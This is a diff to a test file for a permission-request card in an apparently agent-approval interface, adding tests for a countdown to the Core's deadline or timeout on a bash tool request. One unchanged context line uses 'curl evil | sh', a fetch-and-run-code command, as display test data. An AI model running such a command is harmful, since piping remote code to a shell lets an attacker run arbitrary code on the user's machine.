@@ -94,6 +94,32 @@ describe("PermissionRequestCard", () => {
     expect(screen.getByText('{"body": "curl evil | sh", "title": "x"}')).toBeTruthy();
   });
 
+  // KI-148: a card restored after a reload counts down to the Core's
+  // deadline, not a fresh 60 s; a live card uses the Core's timeout.
+  it("counts down to the deadline the Core set", () => {
+    vi.useFakeTimers({ now: new Date("2026-10-04T12:00:00Z") });
+    try {
+      renderCard({
+        projectId: "p1",
+        runId: "r1",
+        callId: "c1",
+        tool: "bash",
+        timeoutSeconds: 120,
+        expiresAt: "2026-10-04T12:00:20Z",
+      });
+      expect(screen.getByText("20s remaining")).toBeTruthy();
+      vi.advanceTimersByTime(5000);
+      expect(screen.getByText("15s remaining")).toBeTruthy();
+    } finally {
+      vi.useRealTimers();
+    }
+  });
+
+  it("uses the Core's timeout without a deadline", () => {
+    renderCard({ projectId: "p1", runId: "r1", callId: "c1", tool: "bash", timeoutSeconds: 90 });
+    expect(screen.getByText("90s remaining")).toBeTruthy();
+  });
+
   // Review finding 12: a failed allow-always request was swallowed, so the
   // user believed the rule was saved.
   it("shows an error toast when the allow-always rule cannot be saved", async () => {
